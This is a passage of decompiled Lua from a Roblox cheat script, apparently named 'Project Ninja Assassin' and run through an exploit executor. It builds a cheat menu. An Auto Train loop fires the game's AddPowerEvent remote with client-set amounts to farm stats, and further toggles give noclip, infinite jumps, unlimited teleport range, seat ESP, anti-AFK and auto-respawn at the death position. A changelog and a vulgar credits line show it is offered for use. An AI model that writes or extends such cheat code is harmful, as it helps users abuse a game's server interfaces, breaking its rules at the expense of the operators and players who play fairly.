            if v802 == nil then
                break
            end
            v803["Permanent" .. v802] = v804.Permanent
        end
        writefile(vu48, v799:JSONEncode(v803))
    end
end
function vu71.LoadSettings()
    local v805 = game:GetService("HttpService")
    if readfile and (isfile and isfile(vu48)) then
        local v806 = v805:JSONDecode(readfile(vu48))
        local v807, v808, v809 = pairs(vu74)
        while true do
            local v810
            v809, v810 = v807(v808, v809)
            if v809 == nil then
                break
            end
            if v806["Permanent" .. v809] then
                vu74[v809].Permanent = v806["Permanent" .. v809]
            end
        end
    end
end
function vu71.AutoExecute()
    print("[Project Ninja Assassin]: Executing AutoExecute Functions..")
    local v811, v812, v813 = pairs(vu147)
    while true do
        local v814
        v813, v814 = v811(v812, v813)
        if v813 == nil then
            break
        end
        print("[Project Ninja Assassin]: (AutoExecute) Executing " .. v813 .. "..")
        v814()
    end
end
function vu71.CreateMainTabs()
    print("[Project Ninja Assassin]: Creating Main Tabs..")
    local function v854()
        local vu815 = {
            NinPlayer = nil,
            RepPlayer = nil
        }
        local function vu822()
            local v816 = vu53
            local v817, v818, v819 = pairs(v816:GetPlayers())
            local v820 = 0
            while true do
                local v821
                v819, v821 = v817(v818, v819)
                if v819 == nil then
                    break
                end
                if v821.Character and (v821.Character:FindFirstChild("Humanoid") and v821.Character.Humanoid.Health >= 1e16) then
                    v820 = v820 + 1
                end
            end
            return v820
        end
        local function vu828()
            vu815.NinPlayer = nil
            vu815.RepPlayer = nil
            local v823 = vu53
            local v824, v825, v826 = pairs(v823:GetPlayers())
            while true do
                local v827
                v826, v827 = v824(v825, v826)
                if v826 == nil then
                    break
                end
                if v827:FindFirstChild("leaderstats") then
                    if vu815.NinPlayer and v827.leaderstats.Ninjutsu.Value > vu815.NinPlayer.leaderstats.Ninjutsu.Value then
                        vu815.NinPlayer = v827
                    elseif not vu815.NinPlayer then
                        vu815.NinPlayer = v827
                    end
                    if vu815.RepPlayer and v827.leaderstats.Reputation.Value > vu815.RepPlayer.leaderstats.Reputation.Value then
                        vu815.RepPlayer = v827
                    elseif not vu815.RepPlayer then
                        vu815.RepPlayer = v827
                    end
                end
            end
        end
        local v829 = vu457.Home
        v829:AddParagraph({
            Title = "Welcome to Project Ninja Assassin, " .. vu53.LocalPlayer.Name .. "!"
        })
        local vu830 = v829:AddParagraph({
            Title = "There are " .. # vu53:GetPlayers() .. "/" .. vu53.MaxPlayers .. " players in the server"
        })
        local v831 = v829.AddParagraph
        local v832 = {}
        local v833 = vu53
        v832.Title = "There are " .. vu822() .. "/" .. # v833:GetPlayers() .. " godded players"
        local vu834 = v831(v829, v832)
        local vu835 = v829:AddParagraph({
            Title = "Server Uptime: " .. vu71.ConvertToHMS(time())
        })
        local vu836 = v829:AddParagraph({
            Title = "Highest ninjutsu player is: N/A"
        })
        local vu837 = v829:AddParagraph({
            Title = "Highest reputation player is: N/A"
        })
        local vu838 = v829:AddParagraph({
            Title = "Player Coordinates: X: 0, Y: 0, Z: 0"
        })
        v829:AddParagraph({
            Title = "Made by 7 big ass beautiful and sexy mother fuckers"
        })
        function vu71.PlayerAdded.HomeTabInfo(pu839)
            task.spawn(function()
                if pu839:WaitForChild("leaderstats") and (pu839.leaderstats:WaitForChild("Ninjutsu").Value > vu815.NinPlayer.leaderstats.Ninjutsu.Value or pu839.leaderstats:WaitForChild("Reputation").Value > vu815.RepPlayer.leaderstats.Reputation.Value) then
                    vu828()
                end
            end)
        end
        function vu71.PlayerRemoved.HomeTabInfo(pu840)
            task.spawn(function()
                if vu815.NinPlayer == pu840 or vu815.RepPlayer == pu840 then
                    vu828()
                end
            end)
        end
        vu828()
        local vu841 = 0.1
        local vu842 = tick()
        local vu843 = 1
        local vu844 = game:GetService("StarterGui")
        local vu845 = game:GetService("RunService")
        local function vu848(p846, ...)
            local v847 = {}
            for _ = 1, vu843 do
                v847 = {
                    pcall(vu844[p846], vu844, ...)
                }
                if v847[1] then
                    break
                end
                vu845.Stepped:Wait()
            end
            return unpack(v847)
        end
        vu55.Heartbeat:Connect(function()
            vu830:SetTitle("There are " .. # vu53:GetPlayers() .. "/" .. vu53.MaxPlayers .. " players in the server")
            local v849 = vu53
            vu834:SetTitle("There are " .. vu822() .. "/" .. # v849:GetPlayers() .. " godded players")
            vu835:SetTitle("Server Uptime: " .. vu71.ConvertToHMS(time()))
            if vu815.NinPlayer then
                vu836:SetTitle("Highest nin player: " .. vu815.NinPlayer.Name .. " with " .. vu71.CommaValue(vu815.NinPlayer.leaderstats.Ninjutsu.Value))
            end
            if vu815.RepPlayer then
                vu837:SetTitle("Highest rep player: " .. vu815.RepPlayer.Name .. " with " .. vu71.HighNumberFormat(vu815.RepPlayer.leaderstats.Reputation.Value))
            end
            local v850 = vu64 and (vu71.GetRoot(vu64) and vu71.GetRoot(vu64).Position)
            if v850 then
                vu838:SetTitle(string.format("Player Coordinates: X = %.2f, Y = %.2f, Z = %.2f", v850.X, v850.Y, v850.Z))
            end
            if tick() >= vu842 + vu841 then
                vu842 = tick()
                local v851 = Instance.new("BindableEvent")
                v851.Event:Connect(function()
                    local v852 = vu53.LocalPlayer
                    if v852.Character then
                        local v853 = v852.Character:FindFirstChild("Humanoid")
                        if v853 then
                            v853.Health = 0
                        end
                    end
                end)
                vu848("SetCore", "ResetButtonCallback", v851)
            end
        end)
    end
    local function v855()
        vu457.Changelog:AddParagraph({
            Title = "Version 1.1.3 - 1/9/2025",
            Content = ">> Heyo! So, I finally got around to making a changelog for the latest update to this script!! The newest version is now v1.1.3 and three whole tabs were created in it including this one.\n>> First is: Leaderboard!! It shows the newest changes to the global ninjutsu leaderboard. This includes ALL 100 PLACES. The changes reported are nin/s, nin/m, and nin/d.\n>> Second is: Music!! It allows you to play your own music if you add the mp3 or ogg file of any music you like into a special folder named \"CustomMusic\" in your exploit\'s Workspace folder. (IMPORTANT: DO NOT PUT ANY SPACES IN THE FILE NAMES)\n>> Third is: none other than this one!! It will hopefully show future changelogs for major versions of this script. I say hopefully because sometimes I\'m just way too lazy to report my changes. I script, I don\'t communicate!\n>> Anyways, thats all I have for this first major update. See ya!"
        })
    end
    local function v1004()
        local v856 = vu457.Training:AddSection("Toggles")
        vu476({
            AutoTrain = false,
            TrainRate = 0.7,
            TrainAmount = 20,
            GainingNegativeNin = false
        })
        v856:AddToggle("AutoTrain", {
            Title = "Auto Train",
            Description = "Automatically trains your ninjutsu. Uses the Train Amount and Train Rate variables to set how much and how often it trains.",
            Default = false,
            Callback = function(p857)
                if p857 then
                    vu70.AutoTrain = true
                    task.spawn(function()
                        while vu70.AutoTrain do
                            if vu70.GainingNegativeNin then
                                task.wait()
                            else
                                game:GetService("ReplicatedStorage").RemoteEvent.AddPowerEvent:FireServer("FromTraining", vu70.TrainAmount)
                                task.wait(vu70.TrainRate)
                                game:GetService("ReplicatedStorage").RemoteEvent.AddPowerEvent:FireServer("FromTraining", vu70.TrainAmount - 0.001)
                                task.wait(vu70.TrainRate)
                            end
                        end
                    end)
                else
                    vu70.AutoTrain = false
                end
            end
        })
        vu476({
            DeathTraining = false
        })
        v856:AddToggle("Death Training", {
            Title = "Death Training",
            Description = "Allows you to use your training sword even if you\'re dead. Works with or without dropping sword.",
            Default = false,
            Callback = function(p858)
                if p858 then
                    vu70.DeathTraining = true
                    local function vu860()
                        if vu70.DeathTraining then
                            if vu53.LocalPlayer.Backpack:FindFirstChild("Train") then
                                vu53.LocalPlayer.Backpack:FindFirstChild("Train").Parent = vu64
                                task.wait(0.03)
                            end
                            local v859 = vu64:FindFirstChild("Train") or workspace:FindFirstChild("Train")
                            if v859 then
                                v859.Handle.CanCollide = true
                                v859.Handle.Anchored = true
                            end
                        end
                    end
                    vu64:WaitForChild("Humanoid", math.huge).Died:Connect(vu860)
                    function vu71.CharacterAdded.DeathTraining(pu861)
                        task.spawn(function()
                            pu861:WaitForChild("Humanoid", math.huge).Died:Connect(vu860)
                        end)
                    end
                else
                    vu70.DeathTraining = false
                    vu71.CharacterAdded.DeathTraining = nil
                end
            end
        })
        vu476({
            SwordList = {},
            DroppingSword = false,
            ResTping = false
        })
        v856:AddToggle("Drop Training Sword", {
            Title = "Drop Training Sword",
            Description = "Allows you to walk, jump, and attack while still being able to train. Reset after you turn it off.",
            Default = false,
            Callback = function(p862)
                if p862 then
                    local function vu869(p863)
                        vu70.DroppingSword = true
                        if # vu70.SwordList ~= 0 then
                            local v864, v865, v866 = pairs(vu70.SwordList)
                            while true do
                                local v867
                                v866, v867 = v864(v865, v866)
                                if v866 == nil then
                                    break
                                end
                                v867:Destroy()
                                vu70.SwordList[v866] = nil
                            end
                        end
                        if not p863:FindFirstChild("Train") and vu53.LocalPlayer.Backpack:FindFirstChild("Train") then
                            vu53.LocalPlayer.Backpack.Train.Parent = p863
                            task.wait(0.03)
                        end
                        local v868 = p863:FindFirstChild("Train")
                        if v868 then
                            v868.CanBeDropped = true
                            task.wait(0.03)
                            v868.Parent = workspace
                            v868.LocalScript.Disabled = true
                            v868.Handle.Transparency = 1
                            vu70.SwordList[# vu70.SwordList + 1] = v868
                        end
                        vu70.DroppingSword = false
                    end
                    if vu64 then
                        vu869(vu64)
                        BackpackChildAdded = vu53.LocalPlayer.Backpack.ChildAdded:Connect(function(p870)
                            if p870.Name == "Train" and vu64 then
                                task.wait(0.03)
                                vu869(vu64)
                                local v871 = vu64:FindFirstChild("Humanoid") and ((vu64.Humanoid:GetState() == Enum.HumanoidStateType.Dead and vu70.DeathTraining and true or false) and workspace:FindFirstChild("Train"))
                                if v871 then
                                    v871.Handle.CanCollide = true
                                    v871.Handle.Anchored = true
                                end
                            end
                        end)
                    end
                    function vu71.CharacterAdded.DropTrainingSword(pu872)
                        task.spawn(function()
                            repeat
                                task.wait(0.05)
                            until vu53.LocalPlayer.Backpack:FindFirstChild("Train")
                            vu869(pu872)
                            BackpackChildAdded:Disconnect()
                            task.wait()
                            BackpackChildAdded = vu53.LocalPlayer.Backpack.ChildAdded:Connect(function(p873)
                                if p873.Name == "Train" and vu64 then
                                    task.wait(0.03)
                                    vu869(vu64)
                                    local v874 = pu872:FindFirstChild("Humanoid") and ((pu872.Humanoid:GetState() == Enum.HumanoidStateType.Dead and vu70.DeathTraining and true or false) and workspace:FindFirstChild("Train"))
                                    if v874 then
                                        v874.Handle.CanCollide = true
                                        v874.Handle.Anchored = true
                                    end
                                end
                            end)
                        end)
                    end
                    function vu71.WorkspaceDescendantRemoved.DropTrainingSword(p875)
                        if table.find(vu70.SwordList, p875) and not vu70.DroppingSword then
                            task.spawn(function()
                                if vu64:FindFirstChild("Humanoid") then
                                    local v876 = vu64.Humanoid.Health <= 0
                                    local v877
                                    if vu67.AutoDeathRespawn.Value then
                                        v877 = false
                                    else
                                        vu67.AutoDeathRespawn:SetValue(true)
                                        v877 = true
                                    end
                                    vu64.Humanoid.Health = - 1
                                    vu53.LocalPlayer.CharacterAdded:Wait()
                                    task.wait()
                                    repeat
                                        task.wait()
                                    until not vu70.ResTping
                                    if v877 then
                                        vu67.AutoDeathRespawn:SetValue(false)
                                    end
                                    repeat
                                        task.wait()
                                    until not vu70.DroppingSword
                                    if v876 and vu64:FindFirstChild("Humanoid") then
                                        vu64.Humanoid.Health = 0
                                    end
                                end
                            end)
                        end
                    end
                else
                    pcall(function()
                        vu71.CharacterAdded.DropTrainingSword = nil
                        vu71.WorkspaceDescendantRemoved.DropTrainingSword = nil
                        BackpackChildAdded:Disconnect()
                    end)
                end
            end
        })
        vu476({
            CharRespawning = false,
            ResPos = nil
        })
        v856:AddToggle("AutoDeathRespawn", {
            Title = "Auto Death Respawn",
            Description = "Automatically respawns your character after you die and teleports you back to your original position.",
            Default = false,
            Callback = function(p878)
                if p878 then
                    local vu879 = nil
                    local vu880 = nil
                    local vu881 = vu53.LocalPlayer
                    local function vu884()
                        if vu64.Humanoid.Health <= 0 and not vu70.CharRespawning then
                            if not vu71.GetRoot(vu64) then
                                return
                            end
                            vu879 = workspace.CurrentCamera.CFrame
                            vu880 = (workspace.CurrentCamera.CFrame.Position - workspace.CurrentCamera.Focus.Position).Magnitude
                            vu70.CharRespawning = true
                            vu70.ResPos = vu71.GetRoot(vu64).CFrame
                            local v882 = vu881.PlayerGui:FindFirstChild("FirstScreenGui").MainSpawnBtn
                            local v883 = vu881.PlayerGui:FindFirstChild("FirstScreenGui").RandomSpawnBtn
                            game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")
                            game:GetService("Lighting"):WaitForChild("Blur").Size = 0
                            game:GetService("Lighting"):WaitForChild("Blur").Enabled = false
                            v882.TextTransparency = 1
                            v882.BackgroundTransparency = 1
                            v883.TextTransparency = 1
                            v883.BackgroundTransparency = 1
                            vu881.PlayerGui:FindFirstChild("FirstScreenGui").Enabled = false
                        end
                    end
                    Autorespawning = vu64:WaitForChild("Humanoid", math.huge).HealthChanged:Connect(vu884)
                    function vu71.CharacterAdded.AutoRespawn()
                        vu70.ResTping = true
                        local vu885 = 0
                        local vu886 = 0
                        local vu887 = vu53.LocalPlayer.CameraMaxZoomDistance
                        local vu888 = vu53.LocalPlayer.CameraMinZoomDistance
                        task.spawn(function()
                            vu71.CheckAllParts(vu64)
                            while vu885 <= 20 do
                                local v889 = vu71.GetRoot(vu64)
                                if v889 and CFrame.new(math.floor(v889.CFrame.X), math.floor(v889.CFrame.Y), math.floor(v889.CFrame.Z)) ~= CFrame.new(math.floor(vu70.ResPos.X), math.floor(vu70.ResPos.Y), math.floor(vu70.ResPos.Z)) then
                                    if vu70.ResPos ~= nil then
                                        v889.CFrame = vu70.ResPos
                                        vu53.LocalPlayer.CameraMaxZoomDistance = vu880
                                        vu53.LocalPlayer.CameraMinZoomDistance = vu880
                                        vu53.LocalPlayer.CameraMaxZoomDistance = vu887
                                        vu53.LocalPlayer.CameraMinZoomDistance = vu888
                                        if vu886 == 0 then
                                            workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
                                            workspace.CurrentCamera.CFrame = vu879
                                            workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
                                        end
                                    end
                                    vu885 = 0
                                elseif v889 then
                                    vu885 = vu885 + 1
                                end
                                vu886 = vu886 + 1
                                if vu886 > 40 then
                                    break
                                end
                                task.wait()
                            end
                            vu70.ResTping = false
                        end)
                        Autorespawning = vu64:WaitForChild("Humanoid", math.huge).Died:Connect(vu884)
                    end
                else
                    vu71.CharacterAdded.AutoRespawn = nil
                    pcall(function()
                        Autorespawning:Disconnect()
                    end)
                    vu70.ResPos = nil
                end
            end
        })
        vu476({
            AntiAfk = false
        })
        v856:AddToggle("Anti Afk", {
            Title = "Anti Afk",
            Description = "Disables the Roblox feature that disconnects you after 20 minutes of inactivity.",
            Default = false,
            Callback = function(p890)
                if p890 then
                    vu70.AntiAfk = true
                    antiafkconnect = vu53.LocalPlayer.Idled:Connect(function()
                        if vu70.AntiAfk then
                            local v891 = game:GetService("VirtualUser")
                            v891:CaptureController()
                            v891:ClickButton2(Vector2.new())
                        end
                    end)
                else
                    vu70.AntiAfk = false
                    pcall(function()
                        antiafkconnect:Disconnect()
                    end)
                end
            end
        })
        vu476({
            AntiBubble = false
        })
        v856:AddToggle("Anti Bubble", {
            Title = "Anti Bubble",
            Description = "Gets rid of your bubble whenever you get it.",
            Default = false,
            Callback = function(p892)
                if p892 then
                    vu70.AntiBubble = true
                    local vu893 = 1
                    local vu894 = nil
                    local function vu895()
                        while true do
                            if vu893 ~= 1 or not vu53.LocalPlayer.Backpack:FindFirstChild("Sword") then
                                if vu893 == 2 and vu53.LocalPlayer.Backpack:FindFirstChild("Shuriken") then
                                    vu894 = vu53.LocalPlayer.Backpack:FindFirstChild("Shuriken")
                                    vu894.Parent = vu64
                                    vu893 = 1
                                end
                            else
                                vu894 = vu53.LocalPlayer.Backpack:FindFirstChild("Sword")
                                vu894.Parent = vu64
                                vu893 = 2
                            end
                            task.wait()
                            if vu894 and vu894.Parent then
                                vu894.Parent = vu53.LocalPlayer.Backpack
                            end
                            if not vu64:FindFirstChild("ForceField") then
                                return
                            end
                        end
                    end
                    if vu64 and vu64:FindFirstChild("ForceField") then
                        vu895()
                    end
                    function vu71.WorkspaceDescendantAdded.AntiBubble(p896)
                        if p896:IsA("ForceField") and (vu64 and p896.Parent == vu64) then
                            if vu70.CharRespawning then
                                repeat
                                    task.wait()
                                until not vu70.CharRespawning
                            end
                            vu895()
                        end
                    end
                else
                    vu71.WorkspaceDescendantAdded.AntiBubble = nil
                    vu70.AntiBubble = false
                end
            end
        })
        local v897 = {
            AutoPosition = false,
            Positioning = {
                X = 0,
                Y = 0,
                Z = 0
            }
        }
        vu476(v897)
        v856:AddToggle("Auto Position", {
            Title = "Auto Position",
            Description = "Automatically teleports you to a position in the world. Uses the X, Y, and Z variables of auto positioning.",
            Default = false,
            Callback = function(p898)
                if p898 then
                    vu70.AutoPosition = true
                    coroutine.resume(coroutine.create(function()
                        while vu70.AutoPosition do
                            local v899 = CFrame.new(vu70.Positioning.x, vu70.Positioning.y, vu70.Positioning.z)
                            if vu71.GetRoot(vu64) then
                                vu71.GetRoot(vu64).CFrame = v899
                            end
                            task.wait(10)
                        end
                    end))
                else
                    vu70.AutoPosition = false
                end
            end
        })
        vu476({
            AutoReconnect = false
        })
        v856:AddToggle("Auto Reconnect", {
            Title = "Auto Reconnect",
            Description = "Automatically reconnects you if you get disconnected from the game.",
            Default = false,
            Callback = function(p900)
                if p900 then
                    vu70.AutoReconnect = true
                    coroutine.resume(coroutine.create(function()
                        while vu70.AutoReconnect do
                            if vu57.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt") and vu57.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt").TitleFrame.ErrorTitle.Text == "Disconnected" then
                                if # vu53:GetPlayers() > 1 then
                                    vu59:TeleportToPlaceInstance(game.PlaceId, game.JobId, vu53.LocalPlayer)
                                else
                                    vu53.LocalPlayer:Kick("\nRejoining...")
                                    task.wait()
                                    vu59:Teleport(game.PlaceId, vu53.LocalPlayer)
                                end
                            end
                            task.wait(0.5)
                        end
                    end))
                else
                    vu70.AutoReconnect = false
                end
            end
        })
        v856:AddToggle("Noclip", {
            Title = "Noclip",
            Description = "Allows you to clip through any basepart in the game.",
            Default = false,
            Callback = function(p901)
                if p901 then
                    function NoclipLoop()
                        if vu64 then
                            local v902 = vu64
                            local v903, v904, v905 = pairs(v902:GetDescendants())
                            while true do
                                local v906
                                v905, v906 = v903(v904, v905)
                                if v905 == nil then
                                    break
                                end
                                if v906:IsA("BasePart") and v906.CanCollide == true then
                                    v906.CanCollide = false
                                end
                            end
                        end
                    end
                    Noclipping = vu55.Stepped:Connect(NoclipLoop)
                else
                    pcall(function()
                        Noclipping:Disconnect()
                    end)
                end
            end
        })
        v856:AddToggle("Freeze Player", {
            Title = "Freeze Player",
            Description = "Completely freezes every part of your character\'s body in place.",
            Default = false,
            Callback = function(p907)
                if p907 then
                    if vu64 then
                        local v908 = vu64
                        local v909, v910, v911 = pairs(v908:GetChildren())
                        while true do
                            local v912
                            v911, v912 = v909(v910, v911)
                            if v911 == nil then
                                break
                            end
                            if v912:IsA("BasePart") and v912.Anchored ~= true then
                                v912.Anchored = true
                            end
                        end
                    end
                    function vu71.CharacterAdded.FreezePlayer()
                        if vu64 then
                            task.wait()
                            local v913 = vu64
                            local v914, v915, v916 = pairs(v913:GetChildren())
                            while true do
                                local v917
                                v916, v917 = v914(v915, v916)
                                if v916 == nil then
                                    break
                                end
                                if v917:IsA("BasePart") and v917.Anchored ~= true then
                                    v917.Anchored = true
                                end
                            end
                        end
                    end
                else
                    if vu64 then
                        local v918 = vu64
                        local v919, v920, v921 = pairs(v918:GetChildren())
                        while true do
                            local v922
                            v921, v922 = v919(v920, v921)
                            if v921 == nil then
                                break
                            end
                            if v922:IsA("BasePart") and v922.Anchored ~= false then
                                v922.Anchored = false
                            end
                        end
                    end
                    vu71.CharacterAdded.FreezePlayer = nil
                end
            end
        })
        v856:AddToggle("Seat ESP", {
            Title = "Seat ESP",
            Description = "Shows where every seat is in the map via box handle adornments.",
            Default = false,
            Callback = function(p923)
                if p923 then
                    local v924, v925, v926 = pairs(workspace:GetDescendants())
                    while true do
                        local v927
                        v926, v927 = v924(v925, v926)
                        if v926 == nil then
                            break
                        end
                        if v927:IsA("Seat") then
                            local v928 = Instance.new("BoxHandleAdornment")
                            v928.Name = "SeatESP"
                            v928.Parent = v927
                            v928.Adornee = v927
                            v928.AlwaysOnTop = true
                            v928.ZIndex = 10
                            v928.Size = v927.Size
                            v928.Transparency = 0.2
                            v928.Color = BrickColor.new(1001)
                        end
                    end
                else
                    local v929, v930, v931 = pairs(game.Workspace:GetDescendants())
                    while true do
                        local v932
                        v931, v932 = v929(v930, v931)
                        if v931 == nil then
                            break
                        end
                        if v932:IsA("Seat") and v932:FindFirstChild("SeatESP") then
                            v932:FindFirstChild("SeatESP"):Destroy()
                        end
                    end
                end
            end
        })
        vu476({
            AntiFirstScreen = false
        })
        v856:AddToggle("Anti First Screen", {
            Title = "Anti First Screen",
            Description = "Disables the respawn screen, or \'First Screen\' as the game calls it, from appearing when you die.",
            Default = false,
            Callback = function(p933)
                if p933 then
                    vu70.AntiFirstScreen = true
                    coroutine.resume(coroutine.create(function()
                        while vu70.AntiFirstScreen do
                            game:GetService("Lighting"):FindFirstChild("Blur").Enabled = false
                            vu63:WaitForChild("PlayerGui"):FindFirstChild("FirstScreenGui").Enabled = false
                            task.wait(0.1)
                        end
                    end))
                else
                    vu70.AntiFirstScreen = false
                end
            end
        })
        vu476({
            InfiniteJump = false
        })
        v856:AddToggle("Infinite Jumps", {
            Title = "Infinite Jumps",
            Description = "Gives you an infinite amount of jumps no matter what your ninjutsu is (you could even have 0).",
            Default = false,
            Callback = function(p934)
                if p934 then
                    vu70.InfiniteJump = true
                    local vu935 = 0
                    local vu936 = 0
                    local vu937 = 0
                    local vu938 = 1
                    local vu939 = true
                    local vu940 = {}
                    local function vu945()
                        local v941 = Instance.new("Part")
                        v941.formFactor = 2
                        v941.Anchored = true
                        v941.Locked = true
                        v941.CanCollide = false
                        v941.archivable = false
                        v941.TopSurface = 0
                        v941.BottomSurface = 0
                        v941.Transparency = 1
                        local v942 = Instance.new("Decal", v941)
                        v942.Face = 1
                        v942.Texture = "http://www.roblox.com/asset/?version=1&id=1280730"
                        local v943 = vu64:FindFirstChild("RightFoot")
                        local v944 = v943.Position
                        v941.CFrame = CFrame.new(v944)
                        v941.Parent = v943
                        v941.Size = Vector3.new(1, 0.4, 1)
                        for _ = 1, 10 do
                            wait(0.05)
                            v941.Size = v941.Size + Vector3.new(0.75, 0, 0.75)
                            v942.Transparency = v942.Transparency + 0.1
                        end
                        v941:Destroy()
                    end
                    local function vu950()
                        local v946, v947, v948 = pairs(vu53.LocalPlayer.Character:FindFirstChild("Humanoid"):GetPlayingAnimationTracks())
                        while true do
                            local v949
                            v948, v949 = v946(v947, v948)
                            if v948 == nil then
                                break
                            end
                            if v949.Name == "JumpAnim1" or v949.Name == "JumpAnim2" then
                                v949:Stop()
                            end
                        end
                    end
                    local function vu954()
                        local v951 = vu64:WaitForChild("Humanoid")
                        if vu938 ~= 1 then
                            if vu938 == 2 then
                                local v952 = vu63:WaitForChild("PlayerGui"):WaitForChild("PlayerScript"):WaitForChild("JumpAnim2")
                                vu950()
                                vu940.JumpAnim2 = v951.Animator:LoadAnimation(v952)
                                vu940.JumpAnim2:Play(0.2, 1, 1)
                            end
                        else
                            local v953 = vu63:WaitForChild("PlayerGui"):WaitForChild("PlayerScript"):WaitForChild("JumpAnim1")
                            vu950()
                            vu940.JumpAnim1 = v951.Animator:LoadAnimation(v953)
                            vu940.JumpAnim1:Play(0.2, 1, 1)
                            return
                        end
                    end
                    local function vu957(_, p955)
                        if p955 ~= Enum.HumanoidStateType.Jumping then
                            if p955 ~= Enum.HumanoidStateType.Freefall or vu936 ~= 0 then
                                if p955 == Enum.HumanoidStateType.Landed then
                                    vu936 = 0
                                    vu939 = true
                                end
                            else
                                vu936 = vu936 + 1
                                if vu935 % 2 ~= 0 then
                                    vu938 = 1
                                else
                                    vu938 = 2
                                end
                                vu935 = vu935 + 1
                                vu939 = vu937 <= vu936
                            end
                        else
                            local v956 = vu63:FindFirstChild("leaderstats"):FindFirstChild("Ninjutsu").Value
                            if v956 < 200 then
                                vu937 = 1
                            elseif 200 <= v956 and v956 < 1000 then
                                vu937 = 2
                            elseif 1000 <= v956 and v956 < 3500 then
                                vu937 = 3
                            elseif 3500 <= v956 and v956 < 17000 then
                                vu937 = 4
                            elseif 17000 <= v956 and v956 < 36000 then
                                vu937 = 5
                            elseif 36000 <= v956 and v956 < 53000 then
                                vu937 = 6
                            elseif 53000 <= v956 and v956 < 84000 then
                                vu937 = 7
                            elseif 84000 <= v956 and v956 < 140000 then
                                vu937 = 8
                            elseif 140000 <= v956 and v956 < 180000 then
                                vu937 = 9
                            elseif 180000 <= v956 and v956 < 240000 then
                                vu937 = 10
                            elseif 240000 <= v956 and v956 < 350000 then
                                vu937 = 11
                            elseif 350000 <= v956 and v956 < 520000 then
                                vu937 = 12
                            elseif 520000 <= v956 and v956 < 830000 then
                                vu937 = 13
                            elseif 830000 <= v956 and v956 < 1000000 then
                                vu937 = 14
                            elseif 1000000 <= v956 and v956 < 1300000 then
                                vu937 = 15
                            elseif 1300000 <= v956 and v956 < 1750000 then
                                vu937 = 16
                            elseif 1750000 <= v956 and v956 < 2250000 then
                                vu937 = 17
                            elseif 2250000 <= v956 and v956 < 2750000 then
                                vu937 = 18
                            elseif 2750000 <= v956 and v956 < 3500000 then
                                vu937 = 19
                            elseif 3500000 <= v956 and v956 < 5000000 then
                                vu937 = 20
                            elseif 5000000 <= v956 and v956 < 10000000 then
                                vu937 = 21
                            elseif v956 >= 10000000 then
                                vu937 = math.huge
                            end
                            vu939 = false
                            wait(0.1)
                            if vu936 ~= 0 then
                                if vu935 % 2 ~= 0 then
                                    vu938 = 1
                                else
                                    vu938 = 2
                                end
                                vu935 = vu935 + 1
                            end
                            vu936 = vu936 + 1
                            vu939 = vu937 <= vu936
                        end
                    end
                    local function vu964(p958, p959)
                        if not p959 then
                            local v960 = vu64:WaitForChild("Humanoid")
                            local v961 = p958.KeyCode == Enum.KeyCode.Space and v960:GetState() ~= Enum.HumanoidStateType.Jumping and vu939
                            if v961 then
                                v961 = vu70.InfiniteJump
                            end
                            if v961 then
                                if vu936 == 0 then
                                    if v960:GetState() == Enum.HumanoidStateType.Freefall then
                                        vu954()
                                        v960:ChangeState(Enum.HumanoidStateType.Jumping)
                                        vu64:FindFirstChild("HumanoidRootPart").Velocity = Vector3.new(0, 0, 0)
                                        local v962 = Instance.new("BodyVelocity")
                                        v962.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        v962.Velocity = Vector3.new(0, 60, 0)
                                        v962.Parent = vu64:FindFirstChild("HumanoidRootPart")
                                        if v960.MoveDirection ~= Vector3.new(0, 0, 0) then
                                            v962.Velocity = v962.Velocity + v960.MoveDirection * 100
                                        end
                                        game:GetService("Debris"):AddItem(v962, 0.01)
                                        vu945()
                                    end
                                else
                                    vu954()
                                    v960:ChangeState(Enum.HumanoidStateType.Jumping)
                                    vu64:FindFirstChild("HumanoidRootPart").Velocity = Vector3.new(0, 0, 0)
                                    local v963 = Instance.new("BodyVelocity")
                                    v963.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    v963.Velocity = Vector3.new(0, 60, 0)
                                    v963.Parent = vu64:FindFirstChild("HumanoidRootPart")
                                    if v960.MoveDirection ~= Vector3.new(0, 0, 0) then
                                        v963.Velocity = v963.Velocity + v960.MoveDirection * 100
                                    end
                                    game:GetService("Debris"):AddItem(v963, 0.01)
                                    vu945()
                                end
                            end
                        end
                    end
                    consecjumpssc = vu64:WaitForChild("Humanoid", math.huge).StateChanged:Connect(vu957)
                    consecjumpsuis = vu54.InputBegan:Connect(vu964)
                    function vu71.CharacterAdded.InfiniteJumps()
                        vu935 = 0
                        vu938 = 1
                        consecjumpssc = vu64:WaitForChild("Humanoid", math.huge).StateChanged:Connect(vu957)
                        consecjumpsuis = vu54.InputBegan:Connect(vu964)
                    end
                else
                    pcall(function()
                        vu70.InfiniteJump = true
                        CharacterAddedFunctions.InfiniteJumps = nil
                        consecjumpssc:Disconnect()
                        consecjumpsuis:Disconnect()
                    end)
                end
            end
        })
        vu476({
            InfiniteTeleport = false
        })
        v856:AddToggle("Infinite Teleport", {
            Title = "Infinite Teleport",
            Description = "Gives you infinite teleporting range, assuming you have the teleport tool.",
            Default = false,
            Callback = function(p965)
                if p965 then
                    vu70.InfiniteTeleport = true
                    local vu966 = vu53.LocalPlayer:GetMouse()
                    local vu967 = {}
                    local function vu975(p968)
                        local v969 = p968.LocalScript.TeleportAnim
                        local v970 = vu64:WaitForChild("Humanoid")
                        local v971, v972, v973 = pairs(vu967)
                        while true do
                            local v974
                            v973, v974 = v971(v972, v973)
                            if v973 == nil then
                                break
                            end
                            v974:Stop()
                        end
                        vu967.WarpAnim = v970:WaitForChild("Animator"):LoadAnimation(v969)
                        vu967.WarpAnim:Play(0.1, 1, 2)
                    end
                    if vu63.leaderstats.Ninjutsu.Value >= 63000 then
                        repeat
                            task.wait(0.05)
                        until vu63.Backpack:FindFirstChild("Teleport") or vu64:FindFirstChild("Teleport")
                        local vu976 = vu63.Backpack:FindFirstChild("Teleport") or vu64:FindFirstChild("Teleport")
                        infteleporting = vu976.Activated:Connect(function()
                            if vu70.InfiniteTeleport and vu63:FindFirstChild("leaderstats").Ninjutsu.Value / 10000 < (vu976.Handle.CFrame.p - vu966.Hit.p).Magnitude then
                                local v977 = vu64
